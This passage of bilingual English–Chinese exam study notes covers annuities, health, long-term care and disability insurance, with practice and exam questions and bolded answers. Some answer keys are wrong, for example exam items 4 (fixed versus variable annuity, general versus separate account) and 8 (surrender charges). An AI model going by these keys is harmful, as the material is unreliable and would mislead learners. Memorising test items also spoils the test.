ten-year period.</strong> </li><li>Iva Pace is receiving annuity payments that will continue as long as she lives, and no further payments will be made after her death.<blockquote><p>保险公司提供不同的支付选项，让合同所有者选择如何获得年金。选择描述年金合同所有者的答案选项，该所有者已选择称为固定期限年金的支付选项。</p><ul><li>兰和弗洛伦斯·托斯卡诺正在领取年金，这将持续到他们两人去世。</li><li>当Marisela Linares购买即时年金时，她告诉保险公司，她将支付25万美元的单一保费，并希望每月获得1000美元的年金。保险公司随后计算了保费加利息每月可支付1000美元年金的时间。</li><li>Kurt Besher的年金为他创造了10年的临时收入流，如果Besher先生在十年期结束前去世，保险公司将向受益人支付剩余的年金。</li><li>Iva Pace正在领取年金，这种年金将持续到她有生之年，在她去世后不会再支付。</li></ul></blockquote></li></ul><p>5.Six years ago, Cassandra Knox purchased a deferred annuity that contains typical provisions with regard to surrenders, annuitization, and withdrawals. If Ms. Knox chooses to</p><ul><li><strong>surrender her deferred annuity, she will receive the annuity’s accumulated value, minus any surrender charges</strong> </li><li>surrender her deferred annuity, she can select a payout option that determines how she will receive the annuity payments</li><li>annuitize her deferred annuity, she will receive a specified percentage of the annuity’s accumulated value each year</li><li>take withdrawals from the annuity, she will lose ownership and control of the funds in the annuity<blockquote><p>六年前，Cassandra Knox购买了一份递延年金，其中包含关于退保、年金化和提款的典型条款。如果诺克斯女士选择</p><ul><li>解约她的递延年金，她将获得年金的累计价值，减去任何解约费用</li><li>解约她的递延年金，她可以选择一个支付选项，决定她将如何获得年金付款</li><li>将她的递延年金作为年金，她每年将获得年金累计价值的特定百分比</li><li>如果从年金中提款，她将失去对年金资金的所有权和控制权</li></ul></blockquote></li></ul><p>6.An insurer invests the premiums from its fixed-rate deferred annuities (FRDAs) in its general account. The ( <strong>insurer</strong>  &#x2F; contract owner) bears the investment risk associated with these annuities. During the accumulation period, the accumulated value of an FRDA earns interest in two ways: a guaranteed minimum interest-crediting rate and a current interest-crediting rate. The current interest-crediting rate (can &#x2F;  <strong>cannot</strong> ) drop below the guaranteed minimum interest-crediting rate.</p><blockquote><p>保险公司将固定利率递延年金（FRDA）的保费投资于其普通账户。（保险人&#x2F;合同所有人）承担与这些年金相关的投资风险。在累积期内，FRDA的累积价值通过两种方式赚取利息：保证的最低利息贷记率和当前利息贷记率。当前的利息贷记利率（可以&#x2F;不能）低于保证的最低利息贷记利率。</p></blockquote><p>7.The following statements are about fixed indexed annuities (FIAs). Three statements are true, and one statement is false. Select the answer choice containing the FALSE statement</p><ul><li>An FIA offers principal and interest rate guarantees and offers the possibility of additional earnings based on changes in an index.</li><li><strong>If the reference index for a given FIA loses value over the interest-crediting term, the contract owner will lose some of the premiums invested in the contract.</strong> </li><li>Generally, if the reference index for a given FIA gains in value over the interest-crediting term, an FIA will earn interest credits.</li><li>An FIA contract typically limits the amount of interest credits that may be earned.<blockquote><p>以下声明是关于固定指数年金的。三种说法是正确的，一种说法是错误的。选择包含FALSE语句的答案选项。</p><ul><li>FIA提供本金和利率担保，并根据指数的变化提供额外收益的可能性。</li><li>如果给定FIA的参考指数在利息贷记期内贬值，则合同所有者将损失投资于合同的部分保费。</li><li>一般来说，如果给定FlA的参考指数在利息抵免期限内增值，FlA将获得利息抵免。</li><li>FIA合同通常会限制可获得的利息信用额度。</li></ul></blockquote></li></ul><p>8.The owner of a variable deferred annuity purchases accumulation units, which represent ownership shares in selected subaccounts of an insurer’s (general &#x2F;  <strong>separate</strong> ) account portfolio. Variable annuities allow contract owners to transfer funds between fixed accounts and subaccounts. A contract owner (incurs &#x2F; <strong>does not incur</strong>) a tax liability for any transfer of funds among fixed accounts and subaccounts during the accumulation period.</p><blockquote><p>可变递延年金的所有者购买累积单位，累积单位代表保险公司（普通&#x2F;单独）账户投资组合中选定子账户的所有权份额。变量年金允许合同所有者在固定账户和子账户之间转移资金。合同所有人（产生&#x2F; 不产生 ）在固定账户之间进行任何资金转移的纳税义务以及累积期间的子账户之间的任何资金转移的纳税义务。</p></blockquote><p>9.Hector Mendoza owns a variable annuity that contains a living benefit rider. According to the terms of this rider, Mr. Mendoza’s annuity guarantees that he may withdraw annually a specified percentage of the benefit base, regardless of the investment performance of the accumulated value. This information indicates that Mr. Mendoza’s annuity contains the type of living benefit rider known as a</p><ul><li>guaranteed minimum income benefit (GMIB)</li><li>guaranteed minimum accumulation benefit (GMAB)</li><li>guaranteed lifetime withdrawal benefit (GLWB)</li><li><strong>guaranteed minimum withdrawal benefit (GMWB)</strong> <blockquote><p>赫克托·门多萨拥有一项可变年金，其中包含一项生活福利附加条款。根据本附加条款，门多萨先生的年金保证，无论累计价值的投资表现如何，他都可以每年提取一定比例的福利基数。这些信息表明，门多萨先生的年金包含一种被称为</p><ul><li>保证最低收入福利 (GMIB)</li><li>保证最低累积福利 (GMAB)</li><li>保证终身提款福利 (GLWB)</li><li>保证最低提款福利（GMWB）</li></ul></blockquote></li></ul><p>10.Shi-Fay Cheng purchased a registered index-linked annuity (RILA) from the Malabar Insurance Company. At the end of the term, the index dropped 15% in value, and the accumulated value of Ms. Cheng’s RILA decreased by 10%. This information indicates that Ms. Cheng’s RILA has a</p><ul><li><strong>floor of 10%</strong> </li><li>floor of 15%</li><li>buffer of 10%</li><li>buffer of 15%<blockquote><p>石法程从马拉巴尔保险公司购买了注册指数挂钩年金（RILA）。期末，该指数价值下跌15%，程女士的RILA累计价值下跌10%。这些信息表明程女士的RILA</p><ul><li>10%的保底</li><li>15%的保底</li><li>缓冲10%</li><li>缓冲15%</li></ul></blockquote></li></ul><h1 id="Lesson-4"><a href="#Lesson-4" class="headerlink" title="Lesson 4"></a>Lesson 4</h1><h2 id="Major-Medical-and-Supplemental-Medical-Insurance【主要医疗保险和补充医疗保险】"><a href="#Major-Medical-and-Supplemental-Medical-Insurance【主要医疗保险和补充医疗保险】" class="headerlink" title="Major Medical and Supplemental Medical Insurance【主要医疗保险和补充医疗保险】"></a>Major Medical and Supplemental Medical Insurance【主要医疗保险和补充医疗保险】</h2><p>Health insurance protects against the risk of financial loss from illness or injury and comes in three forms: 健康保险有三种形式，可防止疾病或伤害造成的经济损失</p><ol><li>Medical expense coverage provides benefits to pay for treatment of illnesses and injuries 医疗费用保险提供用于支付疾病和伤害治疗的福利</li><li>Long-term care (LTC) coverage provides benefits for medical and other services to insureds who need constant care at home or in a qualified facility 长期护理（LTC）保险为需要在家或合格机构持续护理的被保险人提供医疗和其他服务福利</li><li>Disability income coverage provides income replacement benefits to an insured who is unable to work because of illness or injury 残疾收入保险为因病或因伤无法工作的被保险人提供收入替代福利</li></ol><p>Common Medical Expense Exclusions</p><ul><li>Cosmetic surgery (other than required corrective surgery) 美容手术（非必需的矫正手术）</li><li>Illness or injury during military service or acts of war 服役或战争期间的疾病或伤害</li><li>Intentionally self-inflicted injuries 故意造成的伤害</li><li>Routine dental treatments, eye exams, and corrective lenses 常规牙科治疗、眼部检查和矫正镜片</li></ul><p>Cost Participation Methods</p><ul><li>deductible 免赔额：<ul><li>A flat dollar amount of eligible medical expenses that an insured must pay before the insurer begins making any benefit payments under a medical expense insurance policy.</li><li>在保险公司开始根据医疗费用保险单支付任何福利之前，被保险人必须支付的符合条件的医疗费用的固定金额。</li></ul></li><li>coinsurance 自负比例：<ul><li>A percentage of the allowable expenses remaining after the insured has paid the deductible that must be paid by the insured.</li><li>被保险人支付了必须由其支付的 <strong>免赔额后剩余的可允许费用</strong> 的百分比。</li></ul></li><li>maximum out-of-pocket provision: 最高自负额<ul><li>A major medical expense insurance policy provision which states that the policy will cover 100 percent of allowable medical expenses after the insured has paid a specified amount out of pocket to satisfy deductible and coinsurance requirements. Also known as stop-loss provision.</li><li>一种主要医疗费用保险单条款，规定在被保险人自付一定金额以满足免赔额和共同保险要求后，保险单将承保100%允许的医疗费用。也称为止损准备金。</li></ul></li></ul><h2 id="Managed-Care【管理式护理】"><a href="#Managed-Care【管理式护理】" class="headerlink" title="Managed Care【管理式护理】"></a>Managed Care【管理式护理】</h2><p>Insurers emphasize prevention, early intervention, and cost-savings by structuring medical insurance plans so that physicians and insureds are in partnership with the insurer in coordinating the management and delivery of medical care.<br>保险公司通过构建医疗保险计划来强调预防、早期干预和成本节约，以便医生和被保险人与保险公司合作，协调医疗护理的管理和提供。 </p><p>Medical insurance plans can be classified according to how medical care is managed within a plan. Typically, the more freedom insureds are allowed in choosing providers, the higher the cost of the plan.<br>医疗保险计划可以根据计划中医疗保健的管理方式进行分类。通常情况下，被保险人在选择供应商时越自由，计划的成本就越高。</p><p>三种不同类型的医疗保险计划：HMO（Health Maintenance Organization）、PPO（Preferred Provider Organization）和POS（Point of Service）。</p><p>Primary Care Provider (PCP) - 主治医生：</p><ul><li>HMO： 要求选择并与主治医生建立关系，通常需要主治医生的推荐才能获得专科医生的服务。</li><li>PPO： 不需要选择主治医生，可以直接访问专科医生，无需事先获得主治医生的推荐。</li><li>POS： 通常要求选择主治医生，但可以选择直接访问专科医生，需要主治医生的推荐。</li></ul><p>Referrals to Other Providers - 转诊到其他医生：</p><ul><li>HMO： 要求主治医生的转诊才能获得专科医生的服务。</li><li>PPO： 不需要主治医生的转诊，可以直接访问专科医生。</li><li>POS： 通常需要主治医生的转诊才能获得专科医生的服务。</li></ul><p>Use of In-Network Providers - 使用网络内提供者：</p><ul><li>HMO： 要求在医疗网络内选择医生和医疗服务提供者。</li><li>PPO： 对于网络内提供者有更高的福利水平，但可以选择访问网络外的医疗服务提供者。</li><li>POS： 对于网络内提供者有更高的福利水平，但通常也可以选择访问网络外的医疗服务提供者。</li></ul><p>Use of Out-of-Network Providers - 使用网络外提供者：</p><ul><li>HMO： 不支付网络外提供者的费用。</li><li>PPO： 对于网络外提供者有较低的福利水平，但仍然支付一定的费用。</li><li>POS： 对于网络外提供者有较低的福利水平，但仍然支付一定的费用。</li></ul><h2 id="Consumer-Driven-Health-Care【消费者驱动的医疗保健】"><a href="#Consumer-Driven-Health-Care【消费者驱动的医疗保健】" class="headerlink" title="Consumer-Driven Health Care【消费者驱动的医疗保健】"></a>Consumer-Driven Health Care【消费者驱动的医疗保健】</h2><p>A consumer-driven health plan (CDHP) uses a health savings account (HSA) for the payment of routine health care expenses, while a high-deductible health plan (HDHP) protects the insured from catastrophic medical expenses.<br>消费者驱动的健康计划(CDHP)使用健康储蓄账户(HSA)支付日常医疗费用，而高免赔额健康计划(HDHP)保护被保险人免受灾难性医疗费用的影响。</p><p>Once the HSA account is depleted, the employee must pay out of pocket for services until the deductible required for a high-deductible health plan is satisfied.<br>一旦HSA账户耗尽，员工必须自付服务费用，直到满足高免赔额健康计划所需的免赔额。</p><h2 id="Long-Term-Care-Insurance【长期护理保险】"><a href="#Long-Term-Care-Insurance【长期护理保险】" class="headerlink" title="Long-Term Care Insurance【长期护理保险】"></a>Long-Term Care Insurance【长期护理保险】</h2><p>Medical expense coverage is only part of the health insurance picture…another part is long-term care (LTC) coverage, which provides benefits for medical and other services to insureds who need care for an extended period in their own homes or in a qualified facility.<br>医疗费用覆盖范围只是健康保险的一部分，另一部分是长期护理(LTC)覆盖范围，它为需要在自己家中或合格机构长期护理的被保险人提供医疗和其他服务的福利。</p><p>A long-term care insurance policy requirement specifying the conditions that establish an insured’s eligibility to receive long-term care benefits.</p><p>Two common benefit triggers are:</p><ol><li>An inability to complete activities of daily living (ADLs) 无法完成日常生活活动</li><li>Cognitive impairment 认知障碍</li></ol><h2 id="Disability-Income【残疾收入】"><a href="#Disability-Income【残疾收入】" class="headerlink" title="Disability Income【残疾收入】"></a>Disability Income【残疾收入】</h2><p>Three common definitions of total disability:</p><ol><li>Current usual definition, used in most policies 在残疾开始时，被保险人由于疾病或意外事故而无法执行其“通常”职业的职责；在特定期限（通常为两到五年）结束时——残疾使被保险人无法从事其受教育、培训或经验合理适合的任何职业。</li><li>Own previous occupation definition 被保险人在残疾发生时无法继续执行其先前从事的具体职业</li><li>Income loss definition 被保险人在残疾期间可能遭受的收入减少</li></ol><p>Presumptive disabilities include ( <strong>the insured to be considered totally disabled</strong> )</p><ol><li>Total and permanent blindness 完全失明和永久失明</li><li>Loss of the use of any two limbs 四肢瘫痪丧失任何两个肢体的功能</li><li>Loss of speech or hearing 丧失语言或听力</li></ol><p>Insurers specify an  <strong>elimination period</strong>  (waiting period) which is how long an insured must be disabled before disability income benefit payments begin. An elimination period reduces an insurer’s cost to process and pay claims for conditions that last for a very short time.<br>保险公司规定了一个消除期（等待期），即在残疾收入福利金开始支付之前，被保险人必须残疾的时间。消除期降低了保险公司处理和支付持续时间很短的索赔的成本。</p><p>A U.S. federal program that provides disability income benefit payments to qualified individuals.</p><ul><li>Supplemental Security Income (SSI): For people with limited incomes who are disabled, blind, or age 65 or older. The benefit is based on financial need.<ul><li>补充保障收入（SSI）：适用于残疾人、盲人或65岁或以上的收入有限的人。福利是基于经济需要。</li></ul></li><li>Social Security Disability Income (SSDI): For workers under age 65 who have paid Social Security tax. The benefit is based on Social Security taxes paid. SSDI defines total disability as “The inability to work because of sickness or injury that has lasted, or is expected to last, for at least one year, or to lead to death.”<ul><li>社会保障残疾收入（SSDI）：适用于65岁以下缴纳社会保障税的工人。该福利以缴纳的社会保障税为基础。SSDI将完全残疾定义为“由于持续或预计将持续至少一年的疾病或伤害而无法工作，或导致死亡。”</li></ul></li></ul><p>workers’ compensation programs provide: </p><ol><li>Medical expense benefits 医疗费用福利</li><li>Wage replacement benefits 工资替代福利<br>Mandatory employer contributions fund workers’ compensation 雇主强制性供款为工人补偿提供资金</li></ol><h2 id="课后习题-3"><a href="#课后习题-3" class="headerlink" title="课后习题"></a>课后习题</h2><p>1.The most common type of medical expense insurance—major medical coverage—generally pays benefits for</p><ul><li>routine dental treatments</li><li>illness or injury during military service or acts of war</li><li><strong>basic hospital, surgical, and physicians’ expenses</strong> </li><li>intentionally self-inflicted injuries<blockquote><p>最常见的医疗费用保险——主要医疗保险——通常为</p><ul><li>常规牙科治疗</li><li>在服兵役或战争期间生病或受伤</li><li>基本的医院、外科和医生费用</li><li>故意自伤</li></ul></blockquote></li></ul><p>2.Ronald Chung owns an individual medical expense policy that specifies a $500 annual deductible, a 20% coinsurance requirement, and a $5,000 stop-loss provision. In March of this year, Mr. Chung was hospitalized for four days for treatment of pneumonia. During that period of hospitalization, Mr. Chung incurred $12,500 in covered medical expenses. If Mr. Chung incurs no other medical expenses during the year, then his out-of-pocket medical expenses for the year will total</p><ul><li>$2,400</li><li>$2,500</li><li><strong>$2,900</strong> </li><li>$5,000<blockquote><p>Ronald Chung拥有一份个人医疗费用保单，规定每年500美元的免赔额、20%的共同保险要求和5000美元的止损准备金。今年三月，钟因肺炎住院四天。在住院期间，钟先生承担了12500美元的医疗费用。如果钟先生当年没有其他医疗费用，那么他当年的自付医疗费用将总计</p><ul><li>2400美元</li><li>2500美元</li><li>2900美元</li><li>5000美元</li></ul></blockquote></li></ul><p>3.Characteristics of managed care plans typically include<br>    A. Providing financial incentives for insureds to obtain care from network providers<br>    B. Using primary care providers (PCPs) to coordinate insureds’ medical care and access to specialists<br>    C. Placing a greater emphasis on preventive care than do traditional medical expense plans</p><ul><li><strong>A, B,and C</strong> </li><li>A and B only</li><li>B and C only</li><li>A only<blockquote><p>管理式护理计划的特点通常包括<br>    A.为被保险人从网络提供者那里获得护理提供经济激励</p></blockquote></li></ul><blockquote><pre><code>B.利用初级保健提供者（PCP）协调被保险人的医疗护理和专家服务C.比传统的医疗费用计划更重视预防性护理</code></pre><ul><li>A、B和C</li><li>仅限A和B</li><li>仅限B和C</li><li>仅A</li></ul></blockquote><p>4.One alternative to managed care plans is the consumer-driven health plan (CDHP). A CDHP ( <strong>gives</strong>  &#x2F; does not give) individuals the freedom to choose health care providers and benefits. In a typical CDHP, if an employee’s medical costs exceed the amount in the employee’s account, the ( <strong>employee</strong>  &#x2F; employer) must pay the excess costs out of pocket.</p><blockquote><p>管理医疗计划的一个替代方案是消费者驱动的健康计划（CDHP）。CDHP（给予&#x2F;不给予）个人选择医疗保健提供者和福利的自由。在典型的CDHP中，如果员工的医疗费用超过了员工账户中的金额，（员工&#x2F;雇主）必须自掏腰包支付超额费用。</p></blockquote><p>5.For this question, if answer choices (1) through (3) are all correct, select answer choice (4). Otherwise, select the one correct answer choice.<br>For most long-term care insurance policies, benefits are payable if an insured either loses his physical functional capacity to perform at least a specified number of the activities of daily living (ADLs) without assistance or has a severe cognitive impairment. With regard to ADLs, it is correct to say that activities that are considered to be ADLs include</p><ul><li>eating</li><li>bathing</li><li>dressing</li><li><strong>all of the above</strong> <blockquote><p>对于此问题，如果答案选项（1）到（3）都正确，请选择答案选项（4）。否则，请选择一个正确的答案。<br>对于大多数长期护理保险单，如果被保险人在没有帮助的情况下失去了至少一定数量的日常生活活动（ADL）的身体功能能力，或者有严重的认知障碍，则应支付福利。关于ADL，可以正确地说，被认为是ADL的活动包括</p><ul><li>吃</li><li>洗澡</li><li>穿衣</li><li>以上所有内容</li></ul></blockquote></li></ul><p>6.Joyce Wu’s disability income insurance policy contains the current usual definition of total disability that is included in most disability income policies. According to her policy, the definition of total disability changes after the insured has been totally disabled for two years. This information indicates that, should Ms. Wu become disabled, then at the end of the initial two-year period of disability, she will be considered totally disabled only if her disability </p><ul><li>causes her to earn less than she earned before becoming disabled</li><li>prevents her from performing the essential duties of her own previous occupation</li><li>prevents her from performing the essential duties of any occupation and that is expected to last for at least one year, or lead to death</li><li><strong>prevents her from working at any occupation for which she is reasonably fitted by education, training, or experience</strong> <blockquote><p>Joyce Wu的残疾收入保险政策包含了目前大多数残疾收入政策中包含的完全残疾的常见定义。根据她的政策，被保险人完全残疾两年后，完全残疾的定义会发生变化。这些信息表明，如果吴女士成为残疾人，那么在最初的两年残疾期结束时，只有当她的残疾时，她才会被视为完全残疾</p><ul><li>导致她收入低于残疾前的收入</li><li>阻止她履行自己以前职业的基本职责</li><li>阻止她履行任何职业的基本职责，预计该职责将持续至少一年，或导致死亡</li><li>阻止她从事教育、培训或经验合理适合的任何职业</li></ul></blockquote></li></ul><p>7.The following statements are about disability income insurance coverage. Select the answer choice containing the correct statement.</p><ul><li>As a general rule, the benefit amount provided by disability income coverage is intended to fully replace the insured’s pre-disability earnings.</li><li>Most disability income policies are designed to provide benefits beginning on the first day of an insured’s disability.</li><li><strong>A presumptive disability is a stated condition that, if present, automatically causes the insured to be considered totally disabled.</strong> </li><li>In most individual disability policies, the benefit period for short-term disability is limited to one year.<blockquote><p>以下是关于残疾收入保险的声明。选择包含正确陈述的答案。</p><ul><li>一般来说，残疾收入保险提供的福利金额旨在完全取代被保险人残疾前的收入。</li><li>大多数残疾收入政策旨在从被保险人残疾的第一天开始提供福利。</li><li>推定残疾是一种既定条件，如果存在，自动导致被保险人被视为完全残疾。</li><li>在大多数个人残疾政策中，短期残疾的福利期限制为一年。</li></ul></blockquote></li></ul><p>8.The following statements are about government-sponsored disability programs in the United States. Select the answer choice containing the correct statement.</p><ul><li>The definition of total disability established by the Social Security Disability Income (SSDI) program is the “current usual” definition.</li><li><strong>The Supplemental Security Income (SSI) program was established for people with limited incomes who are disabled, blind, or age 65 or older.</strong> </li><li>Workers’ compensation programs provide medical expense benefits, but not wage replacement benefits.</li><li>Workers’ compensation programs are funded by voluntary employee contributions.<blockquote><p>以下是关于美国政府资助的残疾项目的声明。选择包含正确陈述的答案。</p><ul><li>社会保障残疾收入（SSDI）计划对完全残疾的定义是“当前常用”的定义。</li><li>补充保障收入（SSI）计划是为残疾人、盲人或65岁或以上的收入有限的人制定的。</li><li>工人补偿计划提供医疗费用福利，但不提供工资替代福利。</li><li>工人补偿计划由员工自愿捐款资助。</li></ul></blockquote></li></ul><h1 id="考试"><a href="#考试" class="headerlink" title="考试"></a>考试</h1><p>1.The following statements are about managed care plans. Select the answer choice containing the correct statement.</p><ul><li><strong>In general, the greater the level of freedom to choose providers, the higher the cost of the managed care plan to the member.</strong> </li><li>Managed care plans generally do not use copayments.</li><li>All health maintenance organization (HMO) plans provide full benefits for medical services provided by physicians and hospitals outside of the HMO provider network.</li><li>Managed care plans place less of an emphasis on preventive care than do traditional medical expense plans.<blockquote><p>以下陈述是关于管理护理计划的。选择包含正确陈述的答案。</p><ul><li>一般来说，选择提供者的自由度越高，会员的管理护理计划成本就越高。</li><li>托管护理计划通常不使用自付费用。</li><li>所有健康维护组织（HMO）计划都为HMO提供商网络之外的医生和医院提供的医疗服务提供全部好处。</li><li>与传统的医疗费用计划相比，管理护理计划较少强调预防性护理。</li></ul></blockquote></li></ul><p>2.When Maggie Rodriguez, a resident of the United States, purchased her home, she obtained a mortgage loan from the Lilly Bank. She also bought a mortgage insurance policy from the Bellaboo Insurance Company. In this situation, Lilly Bank ( <strong>is</strong>  &#x2F; is not) a party to the mortgage loan contract, and Bellaboo ( <strong>is</strong>  &#x2F; is not) a party to the mortgage insurance contract.</p><blockquote><p>当美国居民Maggie Rodriguez买房时，她从礼来银行获得了抵押贷款。她还从Bellaboo保险公司购买了一份抵押贷款保险单。在这种情况下，礼来银行（是&#x2F;不是）抵押贷款合同的一方，Bellaboo（是&#x2F;不是）抵押保险合同的一方。</p></blockquote><p>3.Kim Hunt purchased a five-year term life insurance policy on her own life. If she were to die during the five-year policy term, the policy benefit would provide for her daughter’s college expenses. Because college expenses are likely to rise each year, Ms. Hunt purchased a type of policy with a benefit amount that goes up each year. In this situation, Ms. Hunt most likely purchased a type of term life insurance known as</p><ul><li>variable life (VL) insurance</li><li>credit life insurance</li><li><strong>increasing term life insurance</strong> </li><li>level term life insurance<blockquote><p>金·亨特为自己的生命购买了一份为期五年的人寿保险。如果她在五年的政策期限内去世，政策福利将用于支付她女儿的大学费用。由于大学费用可能每年都会上涨，亨特女士购买了一种福利金额每年都在上涨的保单。在这种情况下，Hunt女士很可能购买了一种类型的人寿保险</p><ul><li>可变人寿保险</li><li>信用人寿保险</li><li>增加定期人寿保险</li><li>水平定期人寿保险</li></ul></blockquote></li></ul><p>4.Allison Dixon purchased an annuity contract from the Gatlin Insurance Company. Gatlin assumed the investment risk for Ms. Dixon’s annuity contract. This information indicates that Ms. Dixon’s annuity is a ( fixed  &#x2F; <strong>variable</strong>) annuity, and the premiums she paid for this annuity went into Gatlin’s ( general  &#x2F; <strong>separate</strong>) account.</p><blockquote><p>Allison Dixon从Gatlin保险公司购买了一份年金合同。加特林承担了Dixon女士年金合同的投资风险。这些信息表明，Dixon女士的年金是（固定&#x2F;可变）年金，她为该年金支付的保费进入了Gatlin的（普通&#x2F;单独）账户。</p></blockquote><p>5.The following statement(s) can correctly be made about family income coverage:<br>A. Family income coverage is a type of decreasing term life insurance.<br>B. Family income coverage provides a stated monthly income benefit amount to the beneficiary if the insured dies during the term of the coverage.</p><ul><li><strong>Both A and B</strong> </li><li>A only</li><li>B only</li><li>Neither A nor B<blockquote><p>关于家庭收入保险，可以正确地做出以下声明：<br>A.家庭收入保险是一种递减定期人寿保险。<br>B.如果被保险人在保险期内死亡，家庭收入保险将向受益人提供规定的每月收入福利金额。</p><ul><li>A和B</li><li>仅A</li><li>仅限B</li><li>既不是A也不是B</li></ul></blockquote></li></ul><p>6.Jonathan Wilson purchased a $200,000 15-year renewable term insurance policy on his life. At the end of the 15-year term, Mr. Wilson decided to renew the coverage. Assume that Mr. Wilson’s policy renewal is typical. Select the answer choice that correctly identifies this renewed policy’s term of coverage and coverage amount.<br>Term of coverage&#x2F;Amount of coverage</p><ul><li>5-year $100,000</li><li>5-year $200,000</li><li><strong>15-year $200,000</strong> </li><li>15-year $400,000<blockquote><p>乔纳森·威尔逊购买了一份价值20万美元的15年可续期定期人寿保险。在15年任期结束时，Wilson先生决定续保。假设威尔逊先生的政策更新是典型的。选择正确标识此续订保单的保险期限和保险金额的答案选项。<br>保险期限&#x2F;保险金额</p><ul><li>5年100000美元</li><li>5年200000美元</li><li>15年200000美元</li><li>15年400000美元</li></ul></blockquote></li></ul><p>7.At age 51, Diane Fox used a lump-sum distribution from her retirement plan to purchase a fixed annuity from the Lantana Insurance Company. Lantana began making annuity payments of $750 a month to Ms. Fox when she reached age 66. Annuity payments continued until her death at age 86. In this situation, Ms. Fox purchased the type of annuity known as</p><ul><li>an immediate annuity, and her annuity had a 15-year payout period</li><li>an immediate annuity, and her annuity had a 15-year accumulation period</li><li><strong>a deferred annuity, and her annuity had a 15-year payout period</strong> </li><li>a deferred annuity, and her annuity had a 15-year accumulation period<blockquote><p>51岁时，Diane Fox用退休计划中的一次性分配从Lantana保险公司购买了固定年金。Lantana在Fox 66岁时开始每月向她支付750美元的年金。年金一直支付到她86岁去世。在这种情况下，福克斯女士购买了一种被称为</p><ul><li>即时年金，她的年金有15年的支付期</li><li>即时年金，她的年金有15年的累积期</li><li>延期年金，她的年金有15年的支付期</li><li>延期年金，她的年金有15年的累积期</li></ul></blockquote></li></ul><p>8.During a deferred annuity contract’s accumulation period, the contract owner has certain options for accessing the annuity’s accumulated value. The following statement(s) can correctly be made about these options:<br>    A. A typical deferred annuity contract allows the owner to withdraw 10% of the accumulated value each year.<br>    B. An annuity contract owner who surrenders an annuity contract within the first two years after the contract was purchased typically will not have to pay a surrender charge.</p><ul><li><strong>Both A and B</strong></li><li>A only</li><li>B only</li><li>Neither A nor B<blockquote><p>在递延年金合同的累积期内，合同所有者有一定的选择权来获取年金的累积价值。关于这些选项，可以正确地作出以下陈述：<br>A.典型的递延年金合同允许所有者每年提取累计价值的10%。<br>B.年金合同所有人在购买年金合同后的头两年内放弃年金合同，通常不必支付放弃费用。</p><ul><li>A和B</li><li>仅A</li><li>仅限B</li><li>既不是A也不是B</li></ul></blockquote></li></ul><p>9.The most common type of medical expense coverage—major medical coverage—generally pays benefits for<br>    A. Basic hospital expenses<br>    B. Elective cosmetic surgery<br>    C. Routine dental treatments<br>    D. Intentionally self-inflicted injuries</p><ul><li>A, B,and C only</li><li>A and D only</li><li>B and C only</li><li><strong>A only</strong> <blockquote><p>最常见的医疗费用保险类型——主要医疗保险——通常为<br>A.基本住院费用<br>B.选择性整容<br>C.常规牙科治疗<br>D.故意自伤</p><ul><li>仅限A、B和C</li><li>仅限A和D</li><li>仅限B和C</li><li>仅A</li></ul></blockquote></li></ul><p>10.David Boone would like to purchase a cash value life insurance policy. Some information relevant to his purchase is shown below:<br>    • Mr. Boone is prepared to invest a relatively large amount of money in this policy<br>    • Mr. Boone doesn’t want to make premium payments for the remainder of his life<br>    • Mr. Boone wants a policy that provides an immediate cash value<br>In this situation, the most appropriate policy for Mr. Boone to purchase most likely would be</p><ul><li><strong>a single-premium whole life insurance policy</strong> </li><li>a modified-premium whole life insurance policy</li><li>a one-year term life insurance policy</li><li>an increasing term life insurance policy<blockquote><p>David Boone想购买一份现金价值的人寿保险。与他的购买相关的一些信息如下所示：<br>•Boone先生准备在这项政策上投入相对较大的资金<br>•布恩先生不想在余生中支付保费<br>•布恩先生希望制定一项能立即产生现金价值的政策<br>在这种情况下，布恩先生最合适的购买政策很可能是</p><ul><li>单一保费的终身保险单</li><li>修改后的保费终身保险单</li><li>一年期人寿保险单</li><li>增加定期的人寿保险单</li></ul></blockquote></li></ul><p>11.Marcia Rodriguez is interested in purchasing a life insurance policy. Because she would like more flexibility than is provided by a traditional life insurance policy, she is looking at the characteristics of universal life (UL) insurance, variable life (VL) insurance, and variable universal life (VUL). Ms. Rodriguez would like flexible premium payments, and she would also like to choose how her premiums are invested. Based on this information, the best choice for Ms. Rodriguez most likely would be</p><ul><li>a UL insurance policy</li><li><strong>a VUL insurance policy</strong> </li><li>a VL insurance policy</li><li>either a VL insurance policy or a VUL insurance policy<blockquote><p>Marcia Rodriguez有意购买人寿保险。由于她希望获得比传统人寿保险更大的灵活性，她正在研究通用人寿保险（UL）、可变人寿保险（VL）和可变通用人寿保险的特点。罗德里格斯女士希望灵活支付保费，她也希望选择保费的投资方式。根据这些信息，罗德里格斯女士的最佳选择很可能是</p><ul><li>UL保险单</li><li>VUL保险单</li><li>VL保险单</li><li>VL保险单或VUL保险单</li></ul></blockquote></li></ul><p>12.Under one annuity payout option, the insurer guarantees annuity payments for a specified period of time, after which the payments end. If the annuitant dies during the payout period, the insurer pays the remaining annuity payments to a beneficiary until the end of the specified period. This annuity payout option is known as a</p><ul><li>fixed amount option</li><li><strong>fixed period option</strong> </li><li>joint and survivor annuity</li><li>life only annuity option<blockquote><p>根据一种年金支付选项，保险公司保证在指定的一段时间内支付年金，之后付款结束。如果年金受益人在支付期内死亡，保险公司将剩余的年金支付给受益人，直到指定期限结束。这种年金支付选项被称为</p><ul><li>固定金额期权</li><li>固定期限期权</li><li>共同年金和遗属年金</li><li>终身年金期权</li></ul></blockquote></li></ul><p>13.Morris Dell owns a variable annuity contract that contains a guaranteed lifetime withdrawal benefit (GLWB). This benefit guarantees</p><ul><li>that a specified portion of Mr. Dell’s annuity will be invested in a fixed account rather than in subaccounts</li><li>that Mr. Dell can receive a minimum annuity payment amount annually based on the annuitization of the contract’s benefit base</li><li><strong>that Mr. Dell can take annual withdrawals of a specified percentage of a protected value for life without annuitizing the contract</strong> </li><li>that the annuity contract’s death benefit will be equal to the greater of either (a) the premiums paid, less any withdrawals or (b) the contract’s accumulated value<blockquote><p>Morris Dell拥有一份可变年金合同，其中包含终身提款保障福利（GLWB）。此福利保证</p><ul><li>戴尔先生年金的特定部分将投资于固定账户，而不是子账户</li><li>戴尔先生可以根据合同福利基础的年金化每年获得最低年金支付金额</li><li>戴尔先生可以在不使合同年金化的情况下，每年提取受保护价值的特定百分比</li><li>年金合同的死亡抚恤金将等于（a）支付的保费减去任何提款或（b）合同的累计价值中的较大者</li></ul></blockquote></li></ul><p>14.Becky Smith owns an individual medical expense policy that specifies a \$1,000 annual deductible, a 20% coinsurance requirement, and a \$3,000 maximum out-of-pocket provision. In February of last year, Ms. Smith was hospitalized for four days for 